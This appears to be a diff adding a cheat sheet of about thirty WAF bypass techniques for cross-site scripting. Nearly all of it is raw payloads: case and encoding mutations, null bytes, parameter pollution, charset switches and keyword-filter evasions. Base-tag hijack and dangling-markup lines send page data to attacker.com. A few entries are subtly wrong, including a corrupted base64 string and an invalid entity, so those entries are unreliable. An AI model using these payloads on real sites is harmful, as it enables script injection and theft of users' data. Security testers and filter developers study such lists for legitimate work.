@@ -1,0 +1,201 @@
+# WAF Bypass Techniques — Organized by Mechanism
+
+## 1. CASE MUTATION
+<ScRiPt>alert(1)</ScRiPt>
+<scRipt>alert(1)</scRipt>
+<IMG SRC=x onerror=alert(1)>
+<ImG sRc=x OnErRoR=alert(1)>
+<SVG OnLoAd=alert(1)>
+<bOdY OnLoAd=alert(1)>
+
+## 2. COMMENT INJECTION
+<sc<!-->ript>alert(1)</sc<!-->ript>
+<scri<!-->pt>alert(1)</scri<!-->pt>
+<img src=x <!-->onerror=alert(1)>
+<svg<!-->onload=alert(1)>
+
+## 3. WHITESPACE/NEWLINE INJECTION
+<scr\tipt>alert(1)</script>
+<scr%09ipt>alert(1)</script>
+<scr%0aipt>alert(1)</script>
+<scr%0dipt>alert(1)</script>
+<scr%0d%0aipt>alert(1)</script>
+<scr\x0Bipt>alert(1)</script>
+<scr\x0Cipt>alert(1)</script>
+<img src=x	onerror=alert(1)>
+<img src=x
+onerror=alert(1)>
+<img src=x   onerror=alert(1)>
+< script >alert(1)</ script >
+
+## 4. NULL BYTE
+<scri%00pt>alert(1)</script>
+<scr%00ipt>alert(1)</script>
+<img%00src=x onerror=alert(1)>
+<svg%00onload=alert(1)>
+
+## 5. DOUBLE/TRIPLE URL ENCODING
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+%25253Cscript%25253Ealert(1)%25253C%25252Fscript%25253E
+%25252%25255%25253Cscript...
+
+## 6. UNICODE/HEX/OCTAL ENCODING
+<\u0073cript>alert(1)</script>
+<img src=x onerror=\x61lert(1)>
+<svg onload=\141lert(1)>
+\x3Cscript\x3Ealert(1)\x3C/script\x3E
+\74script\76alert(1)\74/script\76
+
+## 7. HTML ENTITY ENCODING
+&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;/script&#62;
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+&newton;script&newton;alert(1)&newton;/script&newton;
+
+## 8. UTF-7 BYPASS
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
++ADw-svg+AD4-onload+AD0-alert(1)+ADw-/svg+AD4-
+
+## 9. DATA URI
+<iframe src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>
+<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvcNyaXB0Pg==>
+<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click
+
+## 10. HPP (HTTP PARAMETER POLLUTION)
+?p=1&p=<script>&r=alert(1)&s=</script>
+?q=<script>&r=alert(1)&s=</script>&q=test
+?a=1&b=2&a=<script>alert(1)</script>
+
+## 11. PARAMETER FRAGMENTATION
+?p=<SCRIPT&q=alert(1)&r=></SCRIPT>
+?a=j&b=a&c=v&d=a&e=s&f=c&g=r&h=i&i=p&j=t>:alert(1)</script>
+
+## 12. CONTENT-TYPE SWITCH
+Content-Type: text/plain -> <script>alert(1)</script>
+Content-Type: application/json -> <script>alert(1)</script>
+Content-Type: multipart/form-data; boundary=x -> --x
+Content-Disposition: form-data; name="x" -> <script>alert(1)</script>
+
+## 13. CHARSET BYPASS
+Content-Type: text/html; charset=utf-7 -> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+Content-Type: text/html; charset=iso-2022-jp
+Content-Type: text/html; charset=utf-16le
+
+## 14. BUFFER OVERFLOW
+# Send 8000+ bytes of padding before the payload
+AAAAAAAA[...8000x...]A<script>alert(1)</script>
+
+## 15. NESTED TAGS
+<script<script>>alert(1)</script>
+<scr<script>ipt>alert(1)</script>
+<svg<svg>onload=alert(1)>
+
+## 16. BROKEN TAG
+<x<script>alert(1)</script>
+<y<img src=x onerror=alert(1)>
+
+## 17. UNCLOSED TAG
+<script>alert(1)
+<img src=x onerror=alert(1)
+
+## 18. BASE TAG HIJACK
+<base href=https://attacker.com/>
+<base target=_blank href=//attacker.com>
+
+## 19. DANGLING MARKUP
+<img src="https://attacker.com/steal?data=
+<img src="//attacker.com/steal?data=
+<a href="//attacker.com/steal?data=
+
+## 20. CSS EXPRESSION (IE LEGACY)
+<div style="x:expression(alert(1))">
+<img style="x:expression(alert(1))">
+<div style="background:url(javascript:alert(1))">
+
+## 21. CDATA BYPASS
+<![CDATA[><script>alert(1)</script>]]>
+<![CDATA[><!--><script>alert(1)</script>--><]]>
+
+## 22. UNICODE FULLWIDTH
+＜ｓｃｒｉｐｔ＞alert(1)＜／ｓｃｒｉｐｔ＞
+＜ｉｍｇ ｓｒｃ＝ｘ onerror=alert(1)＞
+
+## 23. JAVASCRIPT: VARIANT BYPASSES
+javaScript:alert(1)
+JAVASCRIPT:alert(1)
+jav	ascript:alert(1)
+jav%0ascript:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
+
+## 24. EVENT HANDLER VARIATIONS
+onerror=alert(1)
+onerror=&#97;&#108;&#101;&#114;&#116;(1)
+onerror=\u0061\u006c\u0065\u0072\u0074(1)
+onerror=top.alert(1)
+onerror=self.alert(1)
+onerror=window.alert(1)
+onerror=this.alert(1)
+onerror=eval('alert(1)')
+onerror=eval(atob('YWxlcnQoMSk='))
+
+## 25. PARENTHESIS/FUNCTION BYPASS
+# If ( ) are filtered:
+onerror=alert`1`
+onerror=confirm`1`
+onerror=prompt`1`
+onerror=location='javascript:alert\x281\x29'
+onerror=eval`alert\x281\x29`
+onerror=location=name
+onerror=setTimeout`alert\x281\x29`
+
+## 26. QUOTE BYPASS
+# If quotes are filtered:
+onerror=alert(1)     # numeric works
+onerror=String.fromCharCode(97,108,101,114,116,40,49,41)
+onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+onerror=\x61lert\x281\x29
+onerror=alert`1`     # backtick as function call
+
+## 27. KEYWORD FILTER BYPASS
+# 'alert' filtered:
+onerror=top['aler'+'t'](1)
+onerror=self['alert'](1)
+onerror=window['alert'](1)
+onerror=eval('aler'+'t(1)')
+onerror=setTimeout('aler'+'t(1)')
+onerror=Function('aler'+'t(1)')()
+onerror=prompt(1)
+onerror=confirm(1)
+onerror=print()
+onerror=document.write(1)
+
+# 'eval' filtered:
+[].constructor.constructor('alert(1)')()
+Function('alert(1)')()
+setTimeout('alert(1)')
+setInterval('alert(1)')
+
+# 'script' filtered:
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+
+## 28. JSONP CALLBACK
+?callback=<script>alert(1)</script>
+?jsonp=<script>alert(1)</script>
+?cb=<script>alert(1)</script>
+
+## 29. POST FORM CONTENT-TYPE BYPASS
+# Submit form with:
+# Content-Type: application/x-www-form-urlencoded
+# value=<script>alert(1)</script>
+
+# Or:
+# Content-Type: multipart/form-data
+# Content-Disposition: form-data; name="x"
+# <script>alert(1)</script>
+
+## 30. ARRAY-BASED PARAM BYPASS
+?param[]=<script>alert(1)</script>
+?param[0]=<script>alert(1)</script>
+?param[key]=<script>alert(1)</script>
